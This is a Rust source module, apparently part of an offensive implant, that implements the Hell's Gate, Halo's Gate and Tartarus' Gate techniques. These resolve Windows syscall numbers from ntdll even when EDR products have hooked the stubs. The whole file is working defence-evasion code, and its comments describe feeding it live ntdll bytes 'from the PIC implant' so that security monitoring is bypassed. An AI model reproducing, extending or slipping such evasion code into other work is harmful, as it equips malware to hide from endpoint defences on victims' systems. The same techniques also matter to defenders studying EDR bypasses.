//! Syscall-number (SSN) resolution: Hell's Gate → Halo's Gate → Tartarus' Gate.
//!
//! EDRs hook Nt* stubs in ntdll by overwriting the first bytes of the stub
//! (commonly with a `jmp` into the EDR), so the naive "read the stub, parse
//! `mov eax,<ssn>`" (Hell's Gate) returns the wrong/absent SSN for hooked
//! functions. The later techniques recover the real SSN anyway:
//!
//! - **Halo's Gate** (Reenz0h): Nt stubs are laid out consecutively in ntdll,
//!   ~`STRIDE` (0x20) bytes apart and in ascending SSN order. Walk neighbours
//!   (`rva ± k·STRIDE`) until an *unhooked* one is found, then offset its SSN
//!   by the number of stubs walked (`k`).
//! - **Tartarus' Gate** (Paul Laîné): sort *all* Nt/Zw exports by address and
//!   triangulate the hooked stub's SSN from the nearest unhooked neighbours on
//!   either side — tolerates non-uniform spacing/gaps.
//!
//! Everything operates over an abstract [`SyscallSource`] — a function that
//! reads bytes at an RVA plus the export list — so the algorithms unit-test
//! cleanly on any host with a fixture "ntdll image". The live PEB walk of
//! ntdll (Windows) feeds real bytes to these functions from the PIC implant.
//!
//! See also the FreshyCalls / SysWhispers4 comparison: Hell's < Halo's <
//! Tartarus' < FreshyCalls in reliability.

use alloc::string::String;
use alloc::vec::Vec;

/// Spacing between adjacent syscall stubs in ntdll (x64 builds). Used by
/// Halo's/Tartarus' neighbor walk.
pub const STRIDE: u32 = 0x20;
/// Cap on how far Halo's/Tartarus' will walk before giving up.
pub const MAX_WALK: u32 = 512;

/// The clean x64 syscall-stub prologue: `mov r10,rcx` (`4C 8B D1`) then
/// `mov eax,<ssn>` (`B8 <u32>`). EDR hooks replace these leading bytes.
const CLEAN_PROLOGUE: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8];

/// A minimal view of ntdll's syscall stubs, abstracted so resolution is
/// unit-testable with a fixture image (no live Windows / PEB walk required).
pub trait SyscallSource {
    /// Read `len` bytes starting at `rva` (offset from the ntdll base).
    fn read(&self, rva: u32, len: usize) -> Vec<u8>;
    /// The Nt*/Zw* syscall exports as `(name, rva)` pairs, in any order.
    fn exports(&self) -> &[(String, u32)];
}

/// Parse a clean stub's SSN from its first 8 bytes. `None` if the prologue is
/// absent (i.e. the stub is hooked) or there isn't enough data.
pub fn parse_ssn(bytes: &[u8]) -> Option<u32> {
    if bytes.len() >= 8 && bytes[..4] == CLEAN_PROLOGUE {
        Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]))
    } else {
        None
    }
}

/// Hell's Gate: read the stub directly. Fails (`None`) for hooked stubs.
pub fn hells_gate(src: &dyn SyscallSource, rva: u32) -> Option<u32> {
    parse_ssn(&src.read(rva, 8))
}

/// Halo's Gate: if the stub is hooked, walk neighbours at `± k·STRIDE` until an
/// unhooked one is found, then offset its SSN. SSN strictly increases with RVA,
/// so a neighbour *below* (lower RVA) has SSN `target - k` and one *above* has
/// SSN `target + k`.
pub fn halos_gate(src: &dyn SyscallSource, rva: u32) -> Option<u32> {
    if let Some(ssn) = hells_gate(src, rva) {
        return Some(ssn);
    }
    for k in 1..=MAX_WALK {
        let step = k.checked_mul(STRIDE)?;
        if let Some(lo) = rva.checked_sub(step) {
            if let Some(s) = hells_gate(src, lo) {
                return Some(s + k);
            }
        }
        if let Some(hi) = rva.checked_add(step) {
            if let Some(s) = hells_gate(src, hi) {
                return Some(s.saturating_sub(k));
            }
        }
    }
    None
}

/// Tartarus' Gate: sort all exports by RVA and triangulate the hooked stub's
/// SSN from the nearest unhooked neighbours on each side (using the stride
/// implied by two known-clean neighbours when available). More robust than
/// Halo's when stub spacing is non-uniform.
pub fn tartarus_gate(src: &dyn SyscallSource, target_rva: u32) -> Option<u32> {
    // If unhooked, no need to triangulate.
    if let Some(s) = hells_gate(src, target_rva) {
        return Some(s);
    }
    // Nearest unhooked neighbour below (highest RVA < target) and above
    // (lowest RVA > target), each with its resolved SSN.
    let mut below: Option<(u32, u32)> = None;
    let mut above: Option<(u32, u32)> = None;
    for &(_, r) in src.exports() {
        if r == target_rva {
            continue;
        }
        let Some(s) = hells_gate(src, r) else {
            continue;
        };
        let cand = (r, s);
        // Nearest unhooked neighbour below = highest RVA that's still < target.
        if r < target_rva {
            below = Some(match below {
                None => cand,
                Some(b) if b.0 > cand.0 => b,
                _ => cand,
            });
        }
        // Nearest unhooked neighbour above = lowest RVA that's still > target.
        else if r > target_rva {
            above = Some(match above {
                None => cand,
                Some(a) if a.0 < cand.0 => a,
                _ => cand,
            });
        }
    }
    match (below, above) {
        // Two anchors: derive the per-SSN stride from them, then project.
        (Some((br, bs)), Some((ar, as_))) if as_ > bs => {
            let rva_per_ssn = (ar - br) / (as_ - bs);
            let stride = if rva_per_ssn == 0 {
                STRIDE
            } else {
                rva_per_ssn
            };
            Some(bs + (target_rva - br) / stride)
        }
        (Some((br, bs)), _) => Some(bs + (target_rva - br) / STRIDE),
        (None, Some((ar, as_))) => Some(as_.saturating_sub((ar - target_rva) / STRIDE)),
        (None, None) => None,
    }
}

/// Resolve the SSN for every exported syscall, preferring Hell's → Halo's →
/// Tartarus'. Unresolved entries get [`u32::MAX`] (the implant must skip them).
pub fn resolve_table(src: &dyn SyscallSource) -> Vec<(String, u32)> {
    src.exports()
        .iter()
        .map(|(name, rva)| {
            let ssn = hells_gate(src, *rva)
                .or_else(|| halos_gate(src, *rva))
                .or_else(|| tartarus_gate(src, *rva));
            (name.clone(), ssn.unwrap_or(u32::MAX))
        })
        .collect()
}
